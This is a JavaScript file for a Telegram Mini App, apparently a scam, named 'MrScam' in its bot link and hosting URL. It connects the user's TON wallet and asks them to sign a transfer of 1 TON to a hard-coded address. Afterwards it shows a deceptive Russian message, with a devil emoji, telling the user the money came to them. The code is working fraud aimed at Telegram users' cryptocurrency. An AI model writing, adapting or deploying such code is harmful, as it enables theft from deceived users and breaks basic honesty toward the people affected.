window.addEventListener('load', () => {
  const tg = window.Telegram?.WebApp;

  if (!tg || !tg.initDataUnsafe) {
    document.body.innerHTML = '<div style="text-align:center;padding:50px;font-size:1.5em;">🚫 Доступ запрещён<br><a href="https://t.me/MrScam_bot" style="background:#0088cc;color:#fff;padding:15px 30px;border-radius:8px;text-decoration:none;margin-top:20px;display:inline-block;">Открыть в Telegram</a></div>';
    return;
  }

  tg.expand();
  tg.ready();

  const usernameEl = document.getElementById('username');
  let username = 'Guest';
  if (tg.initDataUnsafe.user) {
    const user = tg.initDataUnsafe.user;
    username = user.username ? '@' + user.username : user.first_name || 'User';
  }
  usernameEl.textContent = 'Профиль: ' + username;

  const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://mr-scam.vercel.app/tonconnect-manifest.json',
    buttonRootId: 'connect-container',
    actionsConfiguration: {
      twaReturnUrl: 'https://t.me/MrScam_bot'
    }
  });

  let connectedWallet = null;
  tonConnectUI.onStatusChange(wallet => {
    if (wallet) {
      connectedWallet = wallet.account.address;
      document.getElementById('payment-section').style.display = 'block';
    } else {
      connectedWallet = null;
      document.getElementById('payment-section').style.display = 'none';
    }
  });

  const paymentBtn = document.getElementById('payment-btn');
  paymentBtn.onclick = async () => {
    if (!connectedWallet) {
      alert('⚠️ Подключите кошелёк сначала!');
      return;
    }

    const transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 600,
      messages: [{
        address: 'UQBxxQgA8-hj4UqV-UGNyg8AqOcLYWPsJ4c_3ybg8dyH7jiD',
        amount: '1000000000' // 1 TON
      }]
    };

    try {
      await tonConnectUI.sendTransaction(transaction);
      alert('✅ 1 TON успешно внесено! Деньги пришли тебе 😈');
    } catch (e) {
      alert('❌ Ошибка или отменено');
    }
  };
});
